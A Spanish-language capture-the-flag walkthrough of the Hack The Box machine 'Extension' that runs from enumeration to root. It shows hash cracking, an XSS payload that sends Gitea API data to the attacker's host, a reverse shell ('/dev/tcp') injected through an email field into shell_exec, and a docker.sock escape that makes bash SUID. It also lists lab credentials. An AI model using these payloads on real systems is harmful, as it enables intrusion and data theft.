---
title: Extension
date: 2023-02-17 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: []     # TAG names should always be lowercase
---

```shell
# Nmap 7.92 scan initiated Fri Feb 17 16:25:03 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.171
Nmap scan report for 10.10.11.171
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 82:21:e2:a5:82:4d:df:3f:99:db:3e:d9:b3:26:52:86 (RSA)
|   256 91:3a:b2:92:2b:63:7d:91:f1:58:2b:1b:54:f9:70:3c (ECDSA)
|_  256 65:20:39:2b:a7:3b:33:e5:ed:49:a9:ac:ea:01:bd:37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: snippet.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 17 16:25:18 2023 -- 1 IP address (1 host up) scanned in 15.95 seconds
```
Nos encontramos con una página con un registro y un login, al intentar registrarnos nos menciona que no es posible por el momento. Revisando el código fuente nos encontramos con una constante Ziggy que nos muestra varias rutas. Procedemos a usar expresiones regulares para obtener las rutas y los métodos para llamarlas.

![imagen1](/assets/images/extension/extension1.png)

![imagen2](/assets/images/extension/extension2.png)

```shell
curl http://10.10.11.171/ | grep -oP '{.*?}' | grep uri | awk '{print $2}' FS=":" | awk '{print $1}' FS="," | sed 's/\\//' > rutas.txt
"_ignition/execute-solution"
"_ignition/share-report"
"_ignition/scripts\/{script}
"_ignition/styles\/{style}
"dashboard"
"users"
"snippets"
"snippets/{id}
"snippets/update\/{id}
"snippets/update\/{id}
"snippets/delete\/{id}
"new"
"management/validate"
"management/dump"
"register"
"login"
"forgot-password"
"forgot-password"
"reset-password/{token}
"reset-password"
"verify-email"
"verify-email/{id}
"email/verification-notification"
"confirm-password"
"logout"
"template"
```
Igualmente haciendo fuzzing encontramos subdominios y rutas.

```shell
❯ wfuzz -c -t 80 --hw=896  -w /usr/share/Seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.snippet.htb' -u 'http://snippet.htb'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                     
=====================================================================

000000002:   200        96 L     331 W      5311 Ch     "mail"                                                                                                                                      
000000019:   200        249 L    1197 W     12729 Ch    "dev"      
```
Fuzzeando dev.snippet.htb podemos encontramos una api y swagger implementado. No tenemos autorización para hacer peticiones a la api, pero nos puede ayudar más adelante.

```shell
❯ wfuzz -c --hc=404 -w /usr/share/Seclists/Fuzzing/fuzz-Bo0oM.txt 'http://dev.snippet.htb/FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.snippet.htb/FUZZ
Total requests: 4842

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                     
=====================================================================

000000005:   400        7 L      13 W       182 Ch      "%2e%2e//google.com"                                                                                                                        
000000835:   302        2 L      2 W        34 Ch       "admin"                                                                                                                                     
000001084:   200        302 L    1273 W     13375 Ch    "administrator"                                                                                                                             
000001188:   200        13 L     73 W       818 Ch      "api/swagger"                                                                                                                               
000002271:   302        2 L      2 W        37 Ch       "explore"                                                                                                                                   
000002272:   200        263 L    1141 W     11935 Ch    "explore/repos"
```
En esta nos encontramos con la ruta management/dump donde menciona que podemos hacerle un POST, al intentarlo con burpsuite nos sale que faltan argumentos. Lo mandamos al intruder y fuzzeamos por el argumento.

![imagen4](/assets/images/extension/extension4.png)

Encontramos que download nos da un código de estado diferente.

![imagen5](/assets/images/extension/extension5.png)

Después procedemos a fuzzear el valor y vemos que users nos muestra datos de los usuarios. 

![imagen6](/assets/images/extension/extension6.png)

Copiamos todos esta data en un archivo e intentamos filtrar todos los hashes para poder crackearlo. Encontramos las contraseña `password123` como contraseña y comparando el hash con la lista de usuarios tenemos 4 usuarios que coinciden, letha, fredrick, julian y gia.

```shell
❯ hashcat -m 1400 -a 0 hashes /usr/share/Seclists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 7 4800H with Radeon Graphics, 6374/6438 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 895 digests; 892 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: /usr/share/Seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
Approaching final keyspace - workload adjusted.  
```
Regresamos a la página princiapl y nos intentamos logear con los usuarios encontrados, el usuario gia@snippet.htb es la que se logea satisfactoriamente.

![imagen7](/assets/images/extension/extension7.png)

En los snippets vemos que solo tenemos uno sobre javascript con nada interesante que observar, recordando tenemos unas rutas de la api donde podemos hacer un update de snippets. Primero enumeramos los snippets, en el 1 tenemos el snippet de javascript y en el 2 un snippet que no tenemos autorización de visualizar. 

![imagen9](/assets/images/extension/extension9.png)

Intentamos aplicar un update al 2 y lo ponemos en público para poder verlo. Y en esta podemos ver una autorización en base64, haciéndolo con decode obtenemos una contraseña.

![imagen8](/assets/images/extension/extension8.png)

```shell
❯ echo "amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB" | base64 -d
jean:EHmfar1Y7ppA9O5TAIXnYnJpA  
```
Estas credenciales podemos usarlas para logearnos en gitea en dev.snippet.htb, donde dentro podemos ver un repositorio. En este nos encontramos con un código que hace que nos envíe información sobre las issues. Podemos hacer un XSS para revisar quién nos valida esos issues.

![imagen10](/assets/images/extension/extension10.png)

```js
const list = document.getElementsByClassName("issue list")[0];

const log = console.log

if (!list) {
    log("No gitea page..")
} else {

    const elements = list.querySelectorAll("li");

    elements.forEach((item, index) => {

        const link = item.getElementsByClassName("title")[0]

        const url = link.protocol + "//" + link.hostname + "/api/v1/repos" + link.pathname

        log("Previewing %s", url)

        fetch(url).then(response => response.json())
            .then(data => {
                let issueBody = data.body;

                const limit = 500;
                if (issueBody.length > limit) {
                    issueBody = issueBody.substr(0, limit) + "..."
                }

                issueBody = ": " + issueBody

                issueBody = check(issueBody)

                const desc = item.getElementsByClassName("desc issue-item-bottom-row df ac fw my-1")[0]

                desc.innerHTML += issueBody

            });

    });
}

/**
 * @param str
 * @returns {string|*}
 */
function check(str) {

    // remove tags
    str = str.replace(/<.*?>/, "")

    const filter = [";", "\'", "(", ")", "src", "script", "&", "|", "[", "]"]

    for (const i of filter) {
        if (str.includes(i))
            return ""
    }

    return str

}
```
Al intentar un XSS obtenemos respuesta en nuestro servicio python por le puerto 80.

![imagen11](/assets/images/extension/extension11.png)

```shell
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.14 - - [18/Feb/2023 17:18:41] code 404, message File not found
10.10.14.14 - - [18/Feb/2023 17:18:41] "GET /prueba HTTP/1.1" 404 -
```
Podemos hacer uso de la api de swagger que encontramos fuzzeando para poder obtener información de las repos que tiene Charlie. Podemos intentar utilizar javascript para que nos ejecute la función eval para hacer esto. Y mandar nuestro payload en base64.

```shell
❯ echo -n "fetch('http://dev.snippet.htb/api/v1/users/charlie/repos').then(response => response.text()).then(data => fetch('http://10.10.14.14/'+btoa(data)))" | base64
ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3VzZXJzL2NoYXJsaWUvcmVwb3MnKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkudGhlbihkYXRhID0+IGZldGNoKCdodHRwOi8vMTAuMTAuMTQuMTQvJytidG9hKGRhdGEpKSk=

test<test><img SRC="x" onerror=eval.call`${"eval\x28atob``ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3VzZXJzL2NoYXJsaWUvcmVwb3MnKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkudGhlbihkYXRhID0+IGZldGNoKCdodHRwOi8vMTAuMTAuMTQuMTQvJytidG9hKGRhdGEpKSk=\x29"}`>
```
De esta manera recibimos el output en base64. 

```shell
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.171 - - [18/Feb/2023 21:09:35] code 404, message File not found
10.10.11.171 - - [18/Feb/2023 21:09:35] "GET /W3siaWQiOjIsIm93bmVyIjp7ImlkIjozLCJsb2dpbiI6ImNoYXJsaWUiLCJmdWxsX25hbWUiOiIiLCJlbWFpbCI6ImNoYXJsaWVAc25pcHBldC5odGIiLCJhdmF0YXJfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi91c2VyL2F2YXRhci9jaGFybGllLy0xIiwibGFuZ3VhZ2UiOiIiLCJpc19hZG1pbiI6ZmFsc2UsImxhc3RfbG9naW4iOiIwMDAxLTAxLTAxVDAwOjAwOjAwWiIsImNyZWF0ZWQiOiIyMDIxLTEyLTI3VDAwOjA1OjU5WiIsInJlc3RyaWN0ZWQiOmZhbHNlLCJhY3RpdmUiOmZhbHNlLCJwcm9oaWJpdF9sb2dpbiI6ZmFsc2UsImxvY2F0aW9uIjoiIiwid2Vic2l0ZSI6IiIsImRlc2NyaXB0aW9uIjoiIiwidmlzaWJpbGl0eSI6InB1YmxpYyIsImZvbGxvd2Vyc19jb3VudCI6MCwiZm9sbG93aW5nX2NvdW50IjowLCJzdGFycmVkX3JlcG9zX2NvdW50IjowLCJ1c2VybmFtZSI6ImNoYXJsaWUifSwibmFtZSI6ImJhY2t1cHMiLCJmdWxsX25hbWUiOiJjaGFybGllL2JhY2t1cHMiLCJkZXNjcmlwdGlvbiI6IkJhY2t1cCBvZiBteSBob21lIGRpcmVjdG9yeSIsImVtcHR5IjpmYWxzZSwicHJpdmF0ZSI6dHJ1ZSwiZm9yayI6ZmFsc2UsInRlbXBsYXRlIjpmYWxzZSwicGFyZW50IjpudWxsLCJtaXJyb3IiOmZhbHNlLCJzaXplIjoyNCwiaHRtbF91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2NoYXJsaWUvYmFja3VwcyIsInNzaF91cmwiOiJnaXRAbG9jYWxob3N0OmNoYXJsaWUvYmFja3Vwcy5naXQiLCJjbG9uZV91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2NoYXJsaWUvYmFja3Vwcy5naXQiLCJvcmlnaW5hbF91cmwiOiIiLCJ3ZWJzaXRlIjoiIiwic3RhcnNfY291bnQiOjAsImZvcmtzX2NvdW50IjowLCJ3YXRjaGVyc19jb3VudCI6MSwib3Blbl9pc3N1ZXNfY291bnQiOi0xNCwib3Blbl9wcl9jb3VudGVyIjowLCJyZWxlYXNlX2NvdW50ZXIiOjAsImRlZmF1bHRfYnJhbmNoIjoibWFzdGVyIiwiYXJjaGl2ZWQiOmZhbHNlLCJjcmVhdGVkX2F0IjoiMjAyMi0wMS0wNFQyMToyMjoxNloiLCJ1cGRhdGVkX2F0IjoiMjAyMi0wMS0wNFQyMToyNDozMFoiLCJwZXJtaXNzaW9ucyI6eyJhZG1pbiI6dHJ1ZSwicHVzaCI6dHJ1ZSwicHVsbCI6dHJ1ZX0sImhhc19pc3N1ZXMiOnRydWUsImludGVybmFsX3RyYWNrZXIiOnsiZW5hYmxlX3RpbWVfdHJhY2tlciI6dHJ1ZSwiYWxsb3dfb25seV9jb250cmlidXRvcnNfdG9fdHJhY2tfdGltZSI6dHJ1ZSwiZW5hYmxlX2lzc3VlX2RlcGVuZGVuY2llcyI6dHJ1ZX0sImhhc193aWtpIjp0cnVlLCJoYXNfcHVsbF9yZXF1ZXN0cyI6dHJ1ZSwiaGFzX3Byb2plY3RzIjp0cnVlLCJpZ25vcmVfd2hpdGVzcGFjZV9jb25mbGljdHMiOmZhbHNlLCJhbGxvd19tZXJnZV9jb21taXRzIjp0cnVlLCJhbGxvd19yZWJhc2UiOnRydWUsImFsbG93X3JlYmFzZV9leHBsaWNpdCI6dHJ1ZSwiYWxsb3dfc3F1YXNoX21lcmdlIjp0cnVlLCJkZWZhdWx0X21lcmdlX3N0eWxlIjoibWVyZ2UiLCJhdmF0YXJfdXJsIjoiIiwiaW50ZXJuYWwiOmZhbHNlLCJtaXJyb3JfaW50ZXJ2YWwiOiIifV0K HTTP/1.1" 404 -
```
Haciendo un decode vemos que tiene un repositorio llamado backups.

```shell
{
    "id": 2,
    "owner": {
      "id": 3,
      "login": "charlie",
      "full_name": "",
      "email": "charlie@snippet.htb",
      "avatar_url": "http://dev.snippet.htb/user/avatar/charlie/-1",
      "language": "",
      "is_admin": false,
      "last_login": "0001-01-01T00:00:00Z",
      "created": "2021-12-27T00:05:59Z",
      "restricted": false,
      "active": false,
      "prohibit_login": false,
      "location": "",
      "website": "",
      "description": "",
      "visibility": "public",
      "followers_count": 0,
      "following_count": 0,
      "starred_repos_count": 0,
      "username": "charlie"
    },
    "name": "backups",
    "full_name": "charlie/backups",
    "description": "Backup of my home directory",
    "empty": false,
<SNIP>
```
Por lo que vimos en swapper hay una ruta para ver el contenido del repositorio. Para eso repetimos los mismos pasos.

```shell
❯ echo -n "fetch('http://dev.snippet.htb/api/v1/repos/charlie/backups/contents').then(response => response.text()).then(data => fetch('http://10.10.14.14:8000/'+btoa(data)))" | base64 -w 0
ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xNDo4MDAwLycrYnRvYShkYXRhKSkp
```
Cuando hacemos el decode podemos ver que el repositorio tiene un archivo backup.tar.gz por lo que procedemos a descargarlo. Dentro de este encontramos el backup del sistema de charlie, donde encontramos la id_rsa

```shell
❯ cd charlie
❯ ls -la
drwxr-xr-x guero guero 102 B  Tue Jan  4 15:23:11 2022  .
drwxr-xr-x guero guero  14 B  Sat Feb 18 21:47:33 2023  ..
drwx------ guero guero  32 B  Tue Jan  4 14:58:52 2022  .ssh
drwxr-xr-x guero guero  26 B  Tue Jan  4 15:23:31 2022  backups
.rw------- guero guero  41 B  Tue Jan  4 15:00:48 2022  .bash_history
.rw-r--r-- guero guero 220 B  Sun Jan  2 19:19:52 2022  .bash_logout
.rw-r--r-- guero guero 3.7 KB Sun Jan  2 19:19:52 2022  .bashrc
.rw-r--r-- guero guero 807 B  Sun Jan  2 19:19:52 2022  .profile
```
No logeamos con charlie y vemos que tenemos un archivo git-credentials donde vienen la contraseña del usuario, igualmente al ver el directorio de jean contiene el mismo archivo y podemos ver su contraseña al intentar un su nos migramos a la usuaria jean.

```shell
charlie@extension:/home/jean$ ls
projects  user.txt
charlie@extension:/home/jean$ ls -la
total 48
drwxr-xr-x 5 jean jean 4096 Jun 28  2022 .
drwxr-xr-x 4 root root 4096 Jan  3  2022 ..
lrwxrwxrwx 1 root root    9 Jun 28  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jean jean  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jean jean 3771 Apr  4  2018 .bashrc
drwx------ 2 jean jean 4096 Jan  2  2022 .cache
-rw-rw-r-- 1 jean jean   74 Jan  3  2022 .gitconfig
-rw-rw-rw- 1 jean jean   54 Jun 23  2022 .git-credentials
drwx------ 3 jean jean 4096 Jan  2  2022 .gnupg
-rw-r--r-- 1 jean jean  807 Apr  4  2018 .profile
drwx------ 4 jean jean 4096 Jun 20  2022 projects
-rw-r--r-- 1 jean jean   75 Jan  3  2022 .selected_editor
-rw-r--r-- 1 jean jean    0 Jan  2  2022 .sudo_as_admin_successful
-rw-r----- 1 root jean   33 Feb 18 23:56 user.txt
charlie@extension:/home/jean$ cat .git-credentials
http://jean:EHmfar1Y7ppA9O5TAIXnYnJpA@dev.snippet.htb
```
Usando pspy nos encontramos con unas credenciales para mysql que pareciera que está ejecutando en un contenedor.

```shell
2023/02/19 04:05:02 CMD: UID=0     PID=81288  | /bin/bash /root/clean.sh 
2023/02/19 04:05:02 CMD: UID=0     PID=81294  | docker exec 2ee49381d443 sh -c mysql -u root -ptoor --database webapp --execute "UPDATE users set password='30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82' where email='charlie@snippet.htb';" 
2023/02/19 04:05:02 CMD: UID=0     PID=81301  | /usr/bin/containerd-shim-runc-v2 -namespace moby -id 2ee49381d443b9e04760dcd850264f0274d3bc9b8025058eca373186b776790f -address /run/containerd/containerd.sock 
```
Como la máquina no cuenta con mysql, podemos hacernos port forwarding con ssh para traernos el puerto y conectarnos.

```shell
ssh -i id_rsa charlie@10.10.11.171 -L 3306:127.0.0.1:3306

❯ mysql -h 127.0.0.1 -Dwebapp -uroot -p
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 158
Server version: 5.6.51 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [webapp]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| webapp             |
+--------------------+
4 rows in set (0.091 sec)
```
Dentro del directorio de jean encontramos la aplicación de los snippets, hay un archivo que nos muestra a los usuarios y una columna de user type, podríamos poner admin para ver si hay alguna variación en lo que no muestra la web, pero es mejor buscar por la palabra user type en los archivos de la aplicación. 

```shell
MySQL [webapp]> describe users;
+-------------------+---------------------+------+-----+---------+-------+
| Field             | Type                | Null | Key | Default | Extra |
+-------------------+---------------------+------+-----+---------+-------+
| id                | bigint(20) unsigned | NO   |     | NULL    |       |
| name              | varchar(255)        | NO   |     | NULL    |       |
| email             | varchar(255)        | NO   |     | NULL    |       |
| email_verified_at | timestamp           | YES  |     | NULL    |       |
| password          | varchar(255)        | NO   |     | NULL    |       |
| remember_token    | varchar(100)        | YES  |     | NULL    |       |
| created_at        | timestamp           | YES  |     | NULL    |       |
| updated_at        | timestamp           | YES  |     | NULL    |       |
| user_type         | varchar(255)        | NO   |     | Member  |       |
+-------------------+---------------------+------+-----+---------+-------+
9 rows in set (0.097 sec)
```

```shell
jean@extension:~/projects/laravel-app$ grep -r user_type
resources/views/layouts/navigation.blade.php:                    @if ( Auth::user()->user_type === \App\Http\Middleware\AdminMiddleware::ADMINISTRATOR)
resources/views/layouts/navigation.blade.php:            @if ( Auth::user()->user_type === \App\Http\Middleware\AdminMiddleware::ADMINISTRATOR)
storage/framework/views/a4b96b977997ee8e48cc86884c7d5129c2ae78fd.php:                    <?php if (Auth::user()->user_type === User::ADMINISTRATOR): ?>
storage/framework/views/a4b96b977997ee8e48cc86884c7d5129c2ae78fd.php:            <?php if (Auth::user()->user_type === User::ADMINISTRATOR): ?>
app/Models/User.php:        return Auth::user() && Auth::user()->user_type == User::ADMINISTRATOR;
app/Models/User.php:        'user_type'
jean@extension:~/projects/laravel-app$ cat app/Models/User.php
<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Illuminate\Support\Facades\Auth;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, Notifiable;

    public const ADMINISTRATOR = 'Manager';

    public static function isAdmin()
    {
        return Auth::user() && Auth::user()->user_type == User::ADMINISTRATOR;
    }
<SNIP>
```
Vemos que manager es otro tipo de usuario considero, podemos cambiarle el rol a gia para ver que podemos hacer. Al logearnos vemos que ahora podemos verificar emails. Esto buscando en los archivos de la aplicación nos encontramos con uno vulnerable al tener la función shell_exec. 

```shell
MySQL [webapp]> UPDATE users SET user_type='manager' WHERE email='gia@snippet.htb';
Query OK, 1 row affected (0.095 sec)
Rows matched: 1  Changed: 1  Warnings: 0
MySQL [webapp]> SELECT name,email, user_type FROM users WHERE email='gia@snippet.htb'

+-----------+-----------------+-----------+
| name      | email           | user_type |
+-----------+-----------------+-----------+
| Gia Stehr | gia@snippet.htb | manager   |
+-----------+-----------------+-----------+
1 row in set (0.092 sec)

MySQL [webapp]> 
```
![imagen12](/assets/images/extension/extension12.png)

En esta misma vemos que tenemos shell_exec y está tomando como valor domain, por lo que podemos intentar cambiar el domain del usuario por un comando para darnos una shell.

```shell
jean@extension:~/projects/laravel-app/app/Http/Controllers$ cat AdminController.php | tail -n11 | head -n8
if ($given !== $actual) {
    throw ValidationException::withMessages([
        'email' => "Invalid signature!",
    ]);
}
else {
    $res = shell_exec("ping -c1 -W1 $domain > /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'");
    return Redirect::back()->with('message', trim($res));
}
```
```shell
MySQL [webapp]> UPDATE users SET email='shell@shell|| bash -c "bash -i >& /dev/tcp/10.10.14.14/443 0>&1" &' WHERE name='Kaleigh Lehner'
```
Dándole a validate nos entabla una conección a un contenedor.

```shell
❯ sudo nc -lnvp 443
[sudo] password for guero: 
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.171] 58200
bash: cannot set terminal process group (45): Inappropriate ioctl for device
bash: no job control in this shell
application@4dae106254bf:/var/www/html/public$ whoami
whoami
application
application@4dae106254bf:/var/www/html/public$ 
```
Aquí dentro encontramos un archivo docker.sock que tenemos permisos se escritura. Esta liga muestra como explotar esta parte este [Link](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25 "link") nos puede ayudar. Ejecutamos lo siguiente y regresamos con el usuario jane y vemos que la bash ya es suid.

```shell
cmd="[\"/bin/sh\",\"-c\",\"chroot /mnt && sh -c \\\"chmod u+s /mnt/bin/bash\\\"\"]"
curl --unix-socket /app/docker.sock -d "{\"Image\":\"laravel-app_main\",\"cmd\":$cmd, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=privesc
curl -X POST --unix-socket /app/docker.sock http://localhost/containers/privesc/start
```
```shell
jean@extension:~/projects/laravel-app/config$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
jean@extension:~/projects/laravel-app/config$ bash -p
bash-4.4£ whoami
root
```

